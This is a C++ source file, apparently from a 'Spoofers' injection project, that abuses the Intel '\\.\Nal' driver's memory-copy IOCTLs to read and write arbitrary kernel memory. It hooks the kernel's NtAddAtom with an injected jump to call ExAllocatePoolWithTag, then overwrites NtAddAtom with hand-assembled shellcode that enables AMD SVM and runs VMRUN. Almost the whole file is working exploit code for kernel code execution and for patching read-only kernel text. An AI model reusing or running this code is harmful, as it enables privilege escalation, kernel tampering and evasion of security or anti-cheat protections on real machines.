ñÂ// SVMHypervisorV7.cpp
// V7: Complete VMCB initialization inside shellcode
// Reads CR0/CR3/CR4/EFER/GDTR/IDTR dynamically, sets RIP properly

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

// VMCB offsets (AMD Manual Table 15-1)
#define VMCB_CTRL_INTERCEPT_MISC1 0x00C
#define VMCB_CTRL_INTERCEPT_MISC2 0x010
#define VMCB_CTRL_GUEST_ASID 0x058
#define VMCB_CTRL_EXITCODE 0x070
#define VMCB_CTRL_EXITINFO1 0x078
#define VMCB_CTRL_NRIP 0x0C8

// State save area offsets (Table 15-2)
#define VMCB_SAVE_ES_SEL 0x400
#define VMCB_SAVE_ES_ATTRIB 0x402
#define VMCB_SAVE_ES_LIMIT 0x404
#define VMCB_SAVE_ES_BASE 0x408
#define VMCB_SAVE_CS_SEL 0x410
#define VMCB_SAVE_CS_ATTRIB 0x412
#define VMCB_SAVE_CS_LIMIT 0x414
#define VMCB_SAVE_CS_BASE 0x418
#define VMCB_SAVE_SS_SEL 0x420
#define VMCB_SAVE_SS_ATTRIB 0x422
#define VMCB_SAVE_SS_LIMIT 0x424
#define VMCB_SAVE_SS_BASE 0x428
#define VMCB_SAVE_DS_SEL 0x430
#define VMCB_SAVE_DS_ATTRIB 0x432
#define VMCB_SAVE_DS_LIMIT 0x434
#define VMCB_SAVE_DS_BASE 0x438
#define VMCB_SAVE_GDTR_LIMIT 0x464
#define VMCB_SAVE_GDTR_BASE 0x468
#define VMCB_SAVE_IDTR_LIMIT 0x484
#define VMCB_SAVE_IDTR_BASE 0x488
#define VMCB_SAVE_CPL 0x4CB
#define VMCB_SAVE_EFER 0x4D0
#define VMCB_SAVE_CR4 0x548
#define VMCB_SAVE_CR3 0x550
#define VMCB_SAVE_CR0 0x558
#define VMCB_SAVE_DR7 0x560
#define VMCB_SAVE_DR6 0x568
#define VMCB_SAVE_RFLAGS 0x570
#define VMCB_SAVE_RIP 0x578
#define VMCB_SAVE_RSP 0x5D8
#define VMCB_SAVE_RAX 0x5F8
#define VMCB_SAVE_PAT 0x668

// Intercept bits
#define SVM_INTERCEPT_CPUID (1 << 18) // In MISC1 (0x00C)
#define SVM_INTERCEPT_VMRUN (1 << 0)  // In MISC2 (0x010)

// VMEXIT codes
#define VMEXIT_CPUID 0x72
#define VMEXIT_INVALID -1

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

// ==================== Memory Operations ====================

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;

  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;

  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;

  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;

  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

bool WriteKernelQword(uint64_t address, uint64_t value) {
  return WriteMemory(address, &value, sizeof(value));
}

bool WriteKernelDword(uint64_t address, uint32_t value) {
  return WriteMemory(address, &value, sizeof(value));
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== CallKernelFunction ====================

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;

  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;

  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;

  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;

  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;

  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);

  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));

  if (outResult)
    *outResult = result;
  return true;
}

// ==================== V7 Shellcode ====================
// This shellcode:
// 1. Enables EFER.SVME
// 2. Sets VM_HSAVE_PA MSR
// 3. Reads CR0, CR3, CR4, EFER and stores to VMCB
// 4. Reads GDTR/IDTR and stores to VMCB
// 5. VMSAVE to capture hidden state (FS, GS, etc.)
// 6. Sets guest RIP = return address (LEA trick)
// 7. VMLOAD + VMRUN + VMSAVE
// 8. Returns

// Structure to pass addresses to shellcode
#pragma pack(push, 1)
typedef struct _SHELLCODE_DATA {
  uint64_t vmcbVa;     // Virtual address of VMCB
  uint64_t vmcbPa;     // Physical address of VMCB
  uint64_t hsavePa;    // Physical address of host save area
  uint64_t returnAddr; // Address to return to after guest execution
} SHELLCODE_DATA;
#pragma pack(pop)

// Complete V7 shellcode
// RCX = pointer to SHELLCODE_DATA (first argument to NtAddAtom)
uint8_t v7Shellcode[] = {
    // ===== Prologue - save all registers =====
    0x50,       // push rax
    0x51,       // push rcx
    0x52,       // push rdx
    0x53,       // push rbx
    0x56,       // push rsi
    0x57,       // push rdi
    0x41, 0x50, // push r8
    0x41, 0x51, // push r9
    0x41, 0x52, // push r10
    0x41, 0x53, // push r11

    // RCX = SHELLCODE_DATA pointer (first arg to NtAddAtom)
    0x48, 0x89, 0xCE, // mov rsi, rcx (save data ptr)

    // ===== Step 1: Enable EFER.SVME =====
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000 (SVME)
    0x0F, 0x30,                   // wrmsr

    // ===== Step 2: Set VM_HSAVE_PA MSR =====
    0x48, 0x8B, 0x46, 0x10,       // mov rax, [rsi+0x10] (hsavePa)
    0xB9, 0x17, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010117 (VM_HSAVE_PA)
    0x89, 0xC0,                   // mov eax, eax (low 32)
    0x48, 0xC1, 0xE8, 0x20,       // shr rax, 32
    0x89, 0xC2,                   // mov edx, eax (high 32)
    0x48, 0x8B, 0x46, 0x10,       // mov rax, [rsi+0x10] reload
    0x0F, 0x30,                   // wrmsr

    // ===== Step 3: Get VMCB VA into RBX =====
    0x48, 0x8B, 0x1E, // mov rbx, [rsi] (vmcbVa)

    // ===== Step 4: Read CR0 and store to VMCB =====
    0x0F, 0x20, 0xC0,                         // mov rax, cr0
    0x48, 0x89, 0x83, 0x58, 0x05, 0x00, 0x00, // mov [rbx+0x558], rax (CR0)

    // ===== Step 5: Read CR3 and store to VMCB =====
    0x0F, 0x20, 0xD8,                         // mov rax, cr3
    0x48, 0x89, 0x83, 0x50, 0x05, 0x00, 0x00, // mov [rbx+0x550], rax (CR3)

    // ===== Step 6: Read CR4 and store to VMCB =====
    0x0F, 0x20, 0xE0,                         // mov rax, cr4
    0x48, 0x89, 0x83, 0x48, 0x05, 0x00, 0x00, // mov [rbx+0x548], rax (CR4)

    // ===== Step 7: Read EFER MSR and store to VMCB =====
    0xB9, 0x80, 0x00, 0x00, 0xC0,             // mov ecx, 0xC0000080
    0x0F, 0x32,                               // rdmsr
    0x48, 0xC1, 0xE2, 0x20,                   // shl rdx, 32
    0x48, 0x09, 0xD0,                         // or rax, rdx
    0x48, 0x89, 0x83, 0xD0, 0x04, 0x00, 0x00, // mov [rbx+0x4D0], rax (EFER)

    // ===== Step 8: Read PAT MSR and store to VMCB =====
    0xB9, 0x77, 0x02, 0x00, 0x00,             // mov ecx, 0x277 (IA32_PAT)
    0x0F, 0x32,                               // rdmsr
    0x48, 0xC1, 0xE2, 0x20,                   // shl rdx, 32
    0x48, 0x09, 0xD0,                         // or rax, rdx
    0x48, 0x89, 0x83, 0x68, 0x06, 0x00, 0x00, // mov [rbx+0x668], rax (PAT)

    // ===== Step 9: Read GDTR and store =====
    // sub rsp, 16 for temp storage
    0x48, 0x83, 0xEC, 0x10,             // sub rsp, 16
    0x0F, 0x01, 0x04, 0x24,             // sgdt [rsp]
    0x0F, 0xB7, 0x04, 0x24,             // movzx eax, word [rsp] (limit)
    0x89, 0x83, 0x64, 0x04, 0x00, 0x00, // mov [rbx+0x464], eax (GDTR limit)
    0x48, 0x8B, 0x44, 0x24, 0x02,       // mov rax, [rsp+2] (base)
    0x48, 0x89, 0x83, 0x68, 0x04, 0x00,
    0x00, // mov [rbx+0x468], rax (GDTR base)

    // ===== Step 10: Read IDTR and store =====
    0x0F, 0x01, 0x0C, 0x24,             // sidt [rsp]
    0x0F, 0xB7, 0x04, 0x24,             // movzx eax, word [rsp]
    0x89, 0x83, 0x84, 0x04, 0x00, 0x00, // mov [rbx+0x484], eax (IDTR limit)
    0x48, 0x8B, 0x44, 0x24, 0x02,       // mov rax, [rsp+2]
    0x48, 0x89, 0x83, 0x88, 0x04, 0x00,
    0x00,                   // mov [rbx+0x488], rax (IDTR base)
    0x48, 0x83, 0xC4, 0x10, // add rsp, 16 (restore)

    // ===== Step 11: Read segment selectors =====
    // CS
    0x8C, 0xC8,                               // mov ax, cs
    0x66, 0x89, 0x83, 0x10, 0x04, 0x00, 0x00, // mov [rbx+0x410], ax
    // SS
    0x8C, 0xD0,                               // mov ax, ss
    0x66, 0x89, 0x83, 0x20, 0x04, 0x00, 0x00, // mov [rbx+0x420], ax
    // DS
    0x8C, 0xD8,                               // mov ax, ds
    0x66, 0x89, 0x83, 0x30, 0x04, 0x00, 0x00, // mov [rbx+0x430], ax
    // ES
    0x8C, 0xC0,                               // mov ax, es
    0x66, 0x89, 0x83, 0x00, 0x04, 0x00, 0x00, // mov [rbx+0x400], ax

    // ===== Step 12: Set RFLAGS (pushfq/pop) =====
    0x9C,                                     // pushfq
    0x58,                                     // pop rax
    0x48, 0x89, 0x83, 0x70, 0x05, 0x00, 0x00, // mov [rbx+0x570], rax

    // ===== Step 13: Set RSP (current) =====
    0x48, 0x89, 0xE0,                         // mov rax, rsp
    0x48, 0x89, 0x83, 0xD8, 0x05, 0x00, 0x00, // mov [rbx+0x5D8], rax

    // ===== Step 14: Set ASID = 1 =====
    0xC7, 0x43, 0x58, 0x01, 0x00, 0x00, 0x00, // mov dword [rbx+0x58], 1

    // ===== Step 15: Set intercepts (CPUID + VMRUN) =====
    0xC7, 0x43, 0x0C, 0x00, 0x00, 0x04,
    0x00, // mov dword [rbx+0x0C], 0x40000 (CPUID in MISC1)
    0xC7, 0x43, 0x10, 0x01, 0x00, 0x00,
    0x00, // mov dword [rbx+0x10], 1 (VMRUN in MISC2)

    // ===== Step 16: Get VMCB PA and VMSAVE =====
    0x48, 0x8B, 0x46, 0x08, // mov rax, [rsi+8] (vmcbPa)
    0x0F, 0x01, 0xDB,       // vmsave rax

    // ===== Step 17: Set guest RIP to after VMRUN =====
    // Use LEA to get address of instruction after vmrun
    0x48, 0x8D, 0x0D, 0x0A, 0x00, 0x00, 0x00, // lea rcx, [rip+10] (after vmrun)
    0x48, 0x89, 0x8B, 0x78, 0x05, 0x00, 0x00, // mov [rbx+0x578], rcx (RIP)

    // ===== Step 18: VMLOAD + VMRUN =====
    0x0F, 0x01, 0xDA, // vmload rax
    0x0F, 0x01, 0xD8, // vmrun rax
    // === After VMEXIT, execution continues here ===

    // ===== Step 19: VMSAVE guest state =====
    0x0F, 0x01, 0xDB, // vmsave rax

    // ===== Step 20: STGI - re-enable interrupts =====
    0x0F, 0x01, 0xDC, // stgi

    // ===== Epilogue - restore and return =====
    0x48, 0x31, 0xC0,       // xor rax, rax (return 0)
    0x41, 0x5B,             // pop r11
    0x41, 0x5A,             // pop r10
    0x41, 0x59,             // pop r9
    0x41, 0x58,             // pop r8
    0x5F,                   // pop rdi
    0x5E,                   // pop rsi
    0x5B,                   // pop rbx
    0x5A,                   // pop rdx
    0x59,                   // pop rcx
    0x48, 0x83, 0xC4, 0x08, // add rsp, 8 (skip pushed rax)
    0xC3                    // ret
};

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V7 - Complete Dynamic Initialization    \n");
  printf("    Reads CR0/CR3/CR4/EFER/GDTR/IDTR inside shellcode!        \n");
  printf(
      "================================================================\n\n");

  printf("=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl: 0x%llX\n", ntoskrnlBase);

  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  if (!kernelExAllocatePool) {
    printf("[-] ExAllocatePoolWithTag not found!\n");
    CloseHandle(hDevice);
    return 1;
  }

  // ======================== Step 1: Allocate Memory ========================
  printf("\n=== Step 1: Allocate Kernel Memory ===\n");
  uint64_t allocatedAddr = 0;
  bool success = CallKernelFunction<uint64_t, uint32_t, uint64_t, uint32_t>(
      &allocatedAddr, kernelExAllocatePool, 0, 0x2000, 0x484D5653);

  if (!success || allocatedAddr == 0 || allocatedAddr < 0xFFFF000000000000ULL) {
    printf("[-] Allocation failed!\n");
    CloseHandle(hDevice);
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  printf("[+] VMCB VA:  0x%llX\n", vmcbVa);
  printf("[+] HSAVE VA: 0x%llX\n", hsaveVa);

  // ======================== Step 2: Get Physical Addresses
  // ========================
  printf("\n=== Step 2: Get Physical Addresses ===\n");
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);
  printf("[+] VMCB PA:  0x%llX\n", vmcbPa);
  printf("[+] HSAVE PA: 0x%llX\n", hsavePa);

  // ======================== Step 3: Zero Memory ========================
  printf("\n=== Step 3: Zero Memory ===\n");
  uint8_t zeros[0x1000];
  memset(zeros, 0, sizeof(zeros));
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);
  printf("[+] Memory zeroed\n");

  // ======================== Step 4: Prepare Shellcode Data
  // ========================
  printf("\n=== Step 4: Prepare Shellcode ===\n");

  // Allocate data structure in kernel memory
  uint64_t dataAddr = 0;
  CallKernelFunction<uint64_t, uint32_t, uint64_t, uint32_t>(
      &dataAddr, kernelExAllocatePool, 0, sizeof(SHELLCODE_DATA), 0x56444D53);

  if (!dataAddr || dataAddr < 0xFFFF000000000000ULL) {
    printf("[-] Failed to allocate data struct!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Data addr: 0x%llX\n", dataAddr);

  // Write data
  SHELLCODE_DATA data = {0};
  data.vmcbVa = vmcbVa;
  data.vmcbPa = vmcbPa;
  data.hsavePa = hsavePa;
  data.returnAddr = 0; // Not used in this version
  WriteMemory(dataAddr, &data, sizeof(data));
  printf("[+] Data written\n");

  // ======================== Step 5: Execute V7 Shellcode
  // ========================
  printf("\n=== Step 5: Execute V7 Shellcode ===\n");
  printf("[*] Hypervisor present (before): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");
  printf("[*] Shellcode size: %zu bytes\n", sizeof(v7Shellcode));

  printf(
      "\n================================================================\n");
  printf("V7 will read CR0/CR3/CR4/EFER/GDTR/IDTR dynamically!\n");
  printf("Guest RIP set via LEA to after VMRUN.\n");
  printf("Press ENTER to execute...\n");
  printf("================================================================\n");
  getchar();

  // Backup NtAddAtom
  uint8_t backup[sizeof(v7Shellcode) + 16];
  ReadMemory(kernelNtAddAtom, backup, sizeof(v7Shellcode));

  // Write shellcode
  WriteToReadOnlyMemory(kernelNtAddAtom, v7Shellcode, sizeof(v7Shellcode));

  // Execute - pass data address as first argument (RCX)
  printf("[*] Executing V7 shellcode...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      uint64_t, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(dataAddr, 0, &atom);

  // Restore
  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(v7Shellcode));
  printf("[+] NtAddAtom restored\n");

  printf("[*] Result: 0x%X\n", result);

  // ======================== Final Status ========================
  printf("\n=== Final Status ===\n");
  printf("[*] Hypervisor present (after): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  // Read VMEXIT code from VMCB
  uint64_t exitCode = 0;
  ReadMemory(vmcbVa + VMCB_CTRL_EXITCODE, &exitCode, sizeof(exitCode));
  printf("[*] VMEXIT code: 0x%llX\n", exitCode);

  if (exitCode == VMEXIT_CPUID) {
    printf("[+] VMEXIT due to CPUID intercept - SUCCESS!\n");
  } else if (exitCode != 0 && exitCode != 0xFFFFFFFFFFFFFFFFULL) {
    printf("[*] Got a VMEXIT! Code: 0x%llX\n", exitCode);
  }

  CloseHandle(hDevice);
  return 0;
}
ñÂ*cascade082.file:///C:/inject/Spoofers/SVMHypervisorV7.cpp